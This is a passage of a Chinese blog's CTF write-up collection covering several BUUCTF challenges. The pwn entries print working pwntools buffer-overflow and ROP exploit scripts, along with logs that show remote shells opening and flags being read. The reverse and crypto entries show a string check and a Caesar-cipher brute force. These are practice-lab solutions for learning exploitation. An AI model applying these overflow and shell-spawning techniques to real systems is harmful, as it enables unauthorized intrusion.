bjdctf_2020_babystack</span><br><span class=\"line\">[*] &#x27;/home/randark/shared/bjdctf_2020_babystack&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>IDA打开看一下逻辑：<br><img src=\"/images/Writeup/20210913131210.png\"><br>可以看到应该是利用buf进行栈溢出：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf[<span class=\"number\">12</span>]; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> nbytes; <span class=\"comment\">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>, <span class=\"number\">1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  LODWORD(nbytes) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)nbytes);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210913131328.png\"><br>依此构造playload：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;&#x27;</span>, )</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x10</span>+<span class=\"number\">8</span>) + p32(<span class=\"number\">0x4006E6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>在这里，发现脚本出问题，贴一个网上大佬的脚本：</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context(log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">proc_name = <span class=\"string\">&#x27;./bjdctf_2020_babystack&#x27;</span></span><br><span class=\"line\">elf = ELF(proc_name)</span><br><span class=\"line\"><span class=\"comment\"># p = process(proc_name)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>, <span class=\"number\">25434</span>)</span><br><span class=\"line\">pop_ret = <span class=\"number\">0x400833</span></span><br><span class=\"line\">system_addr = elf.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">bin_sh_str = <span class=\"number\">0x400858</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>.encode() * (<span class=\"number\">0x10</span> + <span class=\"number\">8</span>) + p64(pop_ret) + p64(bin_sh_str) + p64(system_addr)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(payload) + <span class=\"number\">1</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;name?&#x27;</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>得到返回值：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ python Pwn.py</span><br><span class=\"line\">[*] &#x27;/home/randark/shared/bjdctf_2020_babystack&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br><span class=\"line\">[+] Opening connection to node4.buuoj.cn on port 25434: Done</span><br><span class=\"line\">Pwn.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class=\"line\">  p.sendline(str(len(payload) + 1))</span><br><span class=\"line\">[DEBUG] Sent 0x3 bytes:</span><br><span class=\"line\">    b&#x27;49\\n&#x27;</span><br><span class=\"line\">Pwn.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class=\"line\">  p.recvuntil(&#x27;name?&#x27;)</span><br><span class=\"line\">[DEBUG] Received 0xfa bytes:</span><br><span class=\"line\">    b&#x27;**********************************\\n&#x27;</span><br><span class=\"line\">    b&#x27;*     Welcome to the BJDCTF!     *\\n&#x27;</span><br><span class=\"line\">    b&#x27;* And Welcome to the bin world!  *\\n&#x27;</span><br><span class=\"line\">    b&quot;*  Let&#x27;s try to pwn the world!   *\\n&quot;</span><br><span class=\"line\">    b&#x27;* Please told me u answer loudly!*\\n&#x27;</span><br><span class=\"line\">    b&#x27;[+]Are u ready?\\n&#x27;</span><br><span class=\"line\">    b&#x27;[+]Please input the length of your name:\\n&#x27;</span><br><span class=\"line\">    b&quot;[+]What&#x27;s u name?\\n&quot;</span><br><span class=\"line\">[DEBUG] Sent 0x31 bytes:</span><br><span class=\"line\">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class=\"line\">    00000010  61 61 61 61  61 61 61 61  33 08 40 00  00 00 00 00  │aaaa│aaaa│3·@·│····│</span><br><span class=\"line\">    00000020  58 08 40 00  00 00 00 00  90 05 40 00  00 00 00 00  │X·@·│····│··@·│····│</span><br><span class=\"line\">    00000030  0a                                                  │·│</span><br><span class=\"line\">    00000031</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ls</span></span><br><span class=\"line\">[DEBUG] Sent 0x3 bytes:</span><br><span class=\"line\">    b&#x27;ls\\n&#x27;</span><br><span class=\"line\">[DEBUG] Received 0x6d bytes:</span><br><span class=\"line\">    b&#x27;bin\\n&#x27;</span><br><span class=\"line\">    b&#x27;boot\\n&#x27;</span><br><span class=\"line\">    b&#x27;dev\\n&#x27;</span><br><span class=\"line\">    b&#x27;etc\\n&#x27;</span><br><span class=\"line\">    b&#x27;flag\\n&#x27;</span><br><span class=\"line\">    b&#x27;flag.txt\\n&#x27;</span><br><span class=\"line\">    b&#x27;home\\n&#x27;</span><br><span class=\"line\">    b&#x27;lib\\n&#x27;</span><br><span class=\"line\">    b&#x27;lib32\\n&#x27;</span><br><span class=\"line\">    b&#x27;lib64\\n&#x27;</span><br><span class=\"line\">    b&#x27;media\\n&#x27;</span><br><span class=\"line\">    b&#x27;mnt\\n&#x27;</span><br><span class=\"line\">    b&#x27;opt\\n&#x27;</span><br><span class=\"line\">    b&#x27;proc\\n&#x27;</span><br><span class=\"line\">    b&#x27;pwn\\n&#x27;</span><br><span class=\"line\">    b&#x27;root\\n&#x27;</span><br><span class=\"line\">    b&#x27;run\\n&#x27;</span><br><span class=\"line\">    b&#x27;sbin\\n&#x27;</span><br><span class=\"line\">    b&#x27;srv\\n&#x27;</span><br><span class=\"line\">    b&#x27;sys\\n&#x27;</span><br><span class=\"line\">    b&#x27;tmp\\n&#x27;</span><br><span class=\"line\">    b&#x27;usr\\n&#x27;</span><br><span class=\"line\">    b&#x27;var\\n&#x27;</span><br><span class=\"line\">bin</span><br><span class=\"line\">boot</span><br><span class=\"line\">dev</span><br><span class=\"line\">etc</span><br><span class=\"line\">flag</span><br><span class=\"line\">flag.txt</span><br><span class=\"line\">home</span><br><span class=\"line\">lib</span><br><span class=\"line\">lib32</span><br><span class=\"line\">lib64</span><br><span class=\"line\">media</span><br><span class=\"line\">mnt</span><br><span class=\"line\">opt</span><br><span class=\"line\">proc</span><br><span class=\"line\">pwn</span><br><span class=\"line\">root</span><br><span class=\"line\">run</span><br><span class=\"line\">sbin</span><br><span class=\"line\">srv</span><br><span class=\"line\">sys</span><br><span class=\"line\">tmp</span><br><span class=\"line\">usr</span><br><span class=\"line\">var</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> cat flag</span></span><br><span class=\"line\">[DEBUG] Sent 0x9 bytes:</span><br><span class=\"line\">    b&#x27;cat flag\\n&#x27;</span><br><span class=\"line\">[DEBUG] Received 0x2b bytes:</span><br><span class=\"line\">    b&#x27;flag&#123;1d66c11a-8e1b-4255-9e2a-09e4222bb119&#125;\\n&#x27;</span><br><span class=\"line\">flag&#123;1d66c11a-8e1b-4255-9e2a-09e4222bb119&#125;</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> </span></span><br><span class=\"line\">[*] Interrupted</span><br><span class=\"line\">[*] Closed connection to node4.buuoj.cn port 25434</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{1d66c11a-8e1b-4255-9e2a-09e4222bb119}</del></p>\n<hr>\n<p>好欸，多谢林靖学长，找到问题了，是数据发的太快了，容易错位，改进后就可以了：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">25434</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">backdoor = <span class=\"number\">0x4006e6</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>.encode() * (<span class=\"number\">0x10</span>+<span class=\"number\">8</span>) + p64(backdoor)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;of your name:&#x27;</span>,<span class=\"string\">&#x27;100&#x27;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;name?&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>得到返回：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ python Pwn.py</span><br><span class=\"line\">[+] Opening connection to node4.buuoj.cn on port 25434: Done</span><br><span class=\"line\">Pwn.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class=\"line\">  io.sendlineafter(&#x27;of your name:&#x27;,&#x27;100&#x27;)</span><br><span class=\"line\">/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class=\"line\">  res = self.recvuntil(delim, timeout=timeout)</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ls</span></span><br><span class=\"line\">bin</span><br><span class=\"line\">boot</span><br><span class=\"line\">dev</span><br><span class=\"line\">etc</span><br><span class=\"line\">flag</span><br><span class=\"line\">flag.txt</span><br><span class=\"line\">home</span><br><span class=\"line\">lib</span><br><span class=\"line\">lib32</span><br><span class=\"line\">lib64</span><br><span class=\"line\">media</span><br><span class=\"line\">mnt</span><br><span class=\"line\">opt</span><br><span class=\"line\">proc</span><br><span class=\"line\">pwn</span><br><span class=\"line\">root</span><br><span class=\"line\">run</span><br><span class=\"line\">sbin</span><br><span class=\"line\">srv</span><br><span class=\"line\">sys</span><br><span class=\"line\">tmp</span><br><span class=\"line\">usr</span><br><span class=\"line\">var</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> cat flag</span></span><br><span class=\"line\">flag&#123;1d66c11a-8e1b-4255-9e2a-09e4222bb119&#125;</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> </span></span><br><span class=\"line\">[*] Interrupted</span><br><span class=\"line\">[*] Closed connection to node4.buuoj.cn port 25434</span><br></pre></td></tr></table></figure>\n\n<hr>\n<p>参考：<br>1.<a href=\"https://www.freesion.com/article/7762866583/\">bjdctf_2020_babystack</a></p>\n","categories":["Pwn","栈溢出"]},{"title":"ciscn_2019_n_1","url":"/2021/09/12/ciscn_2019_n_1/","content":"<p><a href=\"https://buuoj.cn/challenges#ciscn_2019_n_1\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>先看一下保护信息：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ checksec ciscn_2019_n_1</span><br><span class=\"line\">[*] Checking for new versions of pwntools</span><br><span class=\"line\">    To disable this functionality, set the contents of /home/randark/.cache/.pwntools-cache-3.8/update to &#x27;never&#x27; (old way).</span><br><span class=\"line\">    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):</span><br><span class=\"line\">        [update]</span><br><span class=\"line\">        interval=never</span><br><span class=\"line\">[*] You have the latest version of Pwntools (4.6.0)</span><br><span class=\"line\">[*] &#x27;/home/randark/shared/ciscn_2019_n_1&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>IDA打开看一下逻辑：<br><img src=\"/images/Writeup/20210912164806.png\"><br>看起来是输入了v1，然后校验v2的数据，也就是要溢出数据到v2，看一下v1和v2</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> v1[<span class=\"number\">44</span>]; <span class=\"comment\">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class=\"line\"><span class=\"keyword\">float</span> v2; <span class=\"comment\">// [rsp+2Ch] [rbp-4h]</span></span><br></pre></td></tr></table></figure>\n<p>另外看一下v2的目标值的十六进制数据：<br><img src=\"/images/Writeup/20210912165127.png\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">.rodata:<span class=\"number\">00000000004007B</span>4 s               db <span class=\"string\">&#x27;Let&#x27;</span>,<span class=\"number\">27</span>h,<span class=\"string\">&#x27;s guess the number.&#x27;</span>,<span class=\"number\">0</span></span><br><span class=\"line\">.rodata:<span class=\"number\">00000000004007B</span>4                                         ; DATA XREF: func+<span class=\"number\">11</span>↑o</span><br><span class=\"line\">.rodata:<span class=\"number\">00000000004007</span>CC ; <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> command[]</span><br><span class=\"line\">.rodata:<span class=\"number\">00000000004007</span>CC command         db <span class=\"string\">&#x27;cat /flag&#x27;</span>,<span class=\"number\">0</span>        ; DATA XREF: func+<span class=\"number\">48</span>↑o</span><br><span class=\"line\">.rodata:<span class=\"number\">00000000004007</span>D6 ; <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> aItsValueShould[]</span><br><span class=\"line\">.rodata:<span class=\"number\">00000000004007</span>D6 aItsValueShould db <span class=\"string\">&#x27;Its value should be 11.28125&#x27;</span>,<span class=\"number\">0</span></span><br><span class=\"line\">.rodata:<span class=\"number\">00000000004007</span>D6                                         ; DATA XREF: func:loc_4006CF↑o</span><br><span class=\"line\">.rodata:<span class=\"number\">00000000004007F</span>3                 align <span class=\"number\">4</span></span><br><span class=\"line\">.rodata:<span class=\"number\">00000000004007F</span>4 dword_4007F4    dd <span class=\"number\">41348000</span>h            ; DATA XREF: func+<span class=\"number\">31</span>↑r</span><br><span class=\"line\">.rodata:<span class=\"number\">00000000004007F</span>4                                         ; func+<span class=\"number\">3F</span>↑r</span><br><span class=\"line\">.rodata:<span class=\"number\">00000000004007F</span>4 _rodata         ends</span><br></pre></td></tr></table></figure>\n<p>所以构造Playload：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;&#x27;</span>, )</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x30</span>-<span class=\"number\">0x04</span>) + p32(<span class=\"number\">0x41348000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>得到flag：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ python Pwn.py</span><br><span class=\"line\">[+] Opening connection to node4.buuoj.cn on port 28257: Done</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">Let&#x27;s guess the number.</span><br><span class=\"line\">flag&#123;523f022b-c00a-489b-958e-35b48cdcecb4&#125;</span><br><span class=\"line\">[*] Got EOF while reading in interactive</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> </span></span><br><span class=\"line\">[*] Interrupted</span><br><span class=\"line\">[*] Closed connection to node4.buuoj.cn port 28257</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{523f022b-c00a-489b-958e-35b48cdcecb4}</del></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://buuoj.cn/challenges#[MRCTF2020]CyberPunk\">【BUUCTF - PWN】ciscn_2019_n_1</a></p>\n","categories":["Pwn","栈溢出"]},{"title":"easyre","url":"/2021/08/26/easyre/","content":"<p><a href=\"https://buuoj.cn/challenges#easyre\">题目链接</a><br>拖进IDA分析一下：<br><img src=\"/images/Writeup/20210826162227.png\"><br>其实这时候就能看到flag了，但是仍然要研究一下程序逻辑：<br><img src=\"/images/Writeup/20210826162324.png\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( a == b )</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;flag&#123;this_Is_a_EaSyRe&#125;&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sorry,you can&#x27;t get flag&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n<p>由此可以看出只要输入两个相等的值就可以输出flag：<br><img src=\"/images/Writeup/20210826162504.png\"><br>flag:<del>flag{this_Is_a_EaSyRe}</del></p>\n","categories":["Reserve"]},{"title":"findit","url":"/2021/08/29/findit/","content":"<p><a href=\"https://buuoj.cn/challenges#findit\">题目链接</a><br>附件下载得到程序，看一下核心：<br><img src=\"/images/Writeup/20210829215232.png\"><br>在下面发现有一段数据：<br><img src=\"/images/Writeup/20210829215258.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x70</span><br><span class=\"line\">0x76</span><br><span class=\"line\">0x6b</span><br><span class=\"line\">0x71</span><br><span class=\"line\">0x7b</span><br><span class=\"line\">0x6d</span><br><span class=\"line\">0x31</span><br><span class=\"line\">0x36</span><br><span class=\"line\">0x34</span><br><span class=\"line\">0x36</span><br><span class=\"line\">0x37</span><br><span class=\"line\">0x35</span><br><span class=\"line\">0x32</span><br><span class=\"line\">0x36</span><br><span class=\"line\">0x32</span><br><span class=\"line\">0x30</span><br><span class=\"line\">0x33</span><br><span class=\"line\">0x33</span><br><span class=\"line\">0x6c</span><br><span class=\"line\">0x34</span><br><span class=\"line\">0x6d</span><br><span class=\"line\">0x34</span><br><span class=\"line\">0x39</span><br><span class=\"line\">0x6c</span><br><span class=\"line\">0x6e</span><br><span class=\"line\">0x70</span><br><span class=\"line\">0x37</span><br><span class=\"line\">0x70</span><br><span class=\"line\">0x39</span><br><span class=\"line\">0x6d</span><br><span class=\"line\">0x6e</span><br><span class=\"line\">0x6b</span><br><span class=\"line\">0x32</span><br><span class=\"line\">0x38</span><br><span class=\"line\">0x6b</span><br><span class=\"line\">0x37</span><br><span class=\"line\">0x35</span><br><span class=\"line\">0x7d</span><br></pre></td></tr></table></figure>\n<p>用脚本转换一下ASCII码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s1=[<span class=\"number\">0x70</span>,<span class=\"number\">0x76</span>,<span class=\"number\">0x6b</span>,<span class=\"number\">0x71</span>,<span class=\"number\">0x7b</span>,<span class=\"number\">0x6d</span>,<span class=\"number\">0x31</span>,<span class=\"number\">0x36</span>,<span class=\"number\">0x34</span>,<span class=\"number\">0x36</span>,<span class=\"number\">0x37</span>,<span class=\"number\">0x35</span>,<span class=\"number\">0x32</span>,<span class=\"number\">0x36</span>,<span class=\"number\">0x32</span>,<span class=\"number\">0x30</span>,<span class=\"number\">0x33</span>,<span class=\"number\">0x33</span>,<span class=\"number\">0x6c</span>,<span class=\"number\">0x34</span>,<span class=\"number\">0x6d</span>,<span class=\"number\">0x34</span>,<span class=\"number\">0x39</span>,<span class=\"number\">0x6c</span>,<span class=\"number\">0x6e</span>,<span class=\"number\">0x70</span>,<span class=\"number\">0x37</span>,<span class=\"number\">0x70</span>,<span class=\"number\">0x39</span>,<span class=\"number\">0x6d</span>,<span class=\"number\">0x6e</span>,<span class=\"number\">0x6b</span>,<span class=\"number\">0x32</span>,<span class=\"number\">0x38</span>,<span class=\"number\">0x6b</span>,<span class=\"number\">0x37</span>,<span class=\"number\">0x35</span>,<span class=\"number\">0x7d</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> s1:</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(letter),end=<span class=\"string\">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pvkq&#123;m164675262033l4m49lnp7p9mnk28k75&#125;</span><br></pre></td></tr></table></figure>\n<p>怀疑是凯撒密码，脚本处理：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s1=<span class=\"string\">&quot;pvkq&#123;m164675262033l4m49lnp7p9mnk28k75&#125;&quot;</span></span><br><span class=\"line\">i:<span class=\"built_in\">int</span>=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;=<span class=\"number\">26</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> s1:</span><br><span class=\"line\">\t\ta=<span class=\"built_in\">ord</span>(letter)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> a&gt;=<span class=\"number\">65</span> <span class=\"keyword\">and</span> a&lt;=<span class=\"number\">90</span>:</span><br><span class=\"line\">\t\t\ta=a+i</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> a&gt;<span class=\"number\">90</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(a-<span class=\"number\">90</span>+<span class=\"number\">64</span>),end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(a),end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">elif</span> a&gt;=<span class=\"number\">97</span> <span class=\"keyword\">and</span> a&lt;=<span class=\"number\">122</span>:</span><br><span class=\"line\">\t\t\ta=a+i</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> a&gt;<span class=\"number\">122</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(a-<span class=\"number\">122</span>+<span class=\"number\">96</span>),end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(a),end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(a),end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">\ti+=<span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>运行脚本，得到flag。<br>flag:<del>flag{c164675262033b4c49bdf7f9cda28a75}</del></p>\n","categories":["Reserve","Crypto","凯撒密码"]},{"title":"jarvisoj_level0","url":"/2021/09/13/jarvisoj_level0/","content":"<p><a href=\"https://buuoj.cn/challenges#jarvisoj_level0\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>先看一下保护信息：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ checksec level0</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/randark/shared/level0&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      <span class=\"function\">No <span class=\"title\">PIE</span> <span class=\"params\">(<span class=\"number\">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210913122429.png\"><br>IDA打开看一下逻辑：<br><img src=\"/images/Writeup/20210913125113.png\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  write(<span class=\"number\">1</span>, <span class=\"string\">&quot;Hello, World\\n&quot;</span>, <span class=\"number\">0xD</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> vulnerable_function(<span class=\"number\">1LL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>跟进函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">ssize_t</span> <span class=\"title\">vulnerable_function</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf[<span class=\"number\">128</span>]; <span class=\"comment\">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x200</span>uLL);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>利用read()函数实现栈溢出：<br><img src=\"/images/Writeup/20210913125352.png\"><br><img src=\"/images/Writeup/20210913125415.png\"><br><img src=\"/images/Writeup/20210913130012.png\"><br>构造Playload：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node3.buuoj.cn&#x27;</span>, <span class=\"number\">25076</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x80</span>+<span class=\"number\">8</span>) + p64(<span class=\"number\">0x400596</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>执行脚本，得到返回：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ python Pwn.py</span><br><span class=\"line\">[+] Opening connection to node4.buuoj.cn on port 25076: Done</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">Hello, World</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ls</span></span><br><span class=\"line\">bin</span><br><span class=\"line\">boot</span><br><span class=\"line\">dev</span><br><span class=\"line\">etc</span><br><span class=\"line\">flag</span><br><span class=\"line\">flag.txt</span><br><span 